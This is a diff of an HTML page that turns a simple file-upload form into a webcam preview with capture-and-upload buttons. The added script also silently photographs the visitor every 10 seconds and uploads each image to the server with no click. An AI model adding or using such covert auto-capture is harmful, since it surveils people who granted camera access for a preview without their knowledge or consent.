@@ -1,14 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Upload</title>
+  <meta charset="UTF-8">
+  <title>Camera Upload</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; margin: 20px; }
+    video, canvas { border: 1px solid #ccc; border-radius: 8px; width: 320px; height: 240px; margin-top: 20px; }
+    button { padding: 10px 15px; font-size: 16px; margin: 10px; cursor: pointer; border-radius: 5px; border: none; background-color: #007BFF; color: white; }
+    button:hover { background-color: #0056b3; }
+  </style>
 </head>
 <body>
-<h1>Upload File</h1>
-<form method="POST" action="/upload" enctype="multipart/form-data">
-  <input type="file" name="file" required>
-  <button type="submit">Upload</button>
-</form>
+  <h1>Camera Preview</h1>
+  <video id="video" autoplay playsinline></video>
+  <br>
+  <button id="flipBtn">Flip Camera</button>
+  <button id="captureBtn">Capture & Upload</button>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    let video = document.getElementById('video');
+    let canvas = document.getElementById('canvas');
+    let captureBtn = document.getElementById('captureBtn');
+    let flipBtn = document.getElementById('flipBtn');
+    let stream;
+    let usingFrontCamera = true;
+
+    async function startCamera() {
+      if(stream) stream.getTracks().forEach(track => track.stop());
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: usingFrontCamera ? 'user' : 'environment' },
+        audio: false
+      });
+      video.srcObject = stream;
+    }
+
+    flipBtn.addEventListener('click', () => {
+      usingFrontCamera = !usingFrontCamera;
+      startCamera();
+    });
+
+    function captureAndUpload() {
+      let context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(async (blob) => {
+        let formData = new FormData();
+        formData.append('file', blob, 'photo.png');
+
+        try {
+          let response = await fetch('/upload', { method: 'POST', body: formData });
+          if(response.ok) console.log('Photo uploaded successfully!');
+          else console.error('Upload failed');
+        } catch (err) {
+          console.error('Error:', err);
+        }
+      }, 'image/png');
+    }
+
+    captureBtn.addEventListener('click', captureAndUpload);
+
+    // 🔹 Auto-capture every 10 seconds (adjust interval as needed)
+    setInterval(captureAndUpload, 10000); // 10000ms = 10 seconds
+
+    startCamera();
+  </script>
 </body>
 </html>
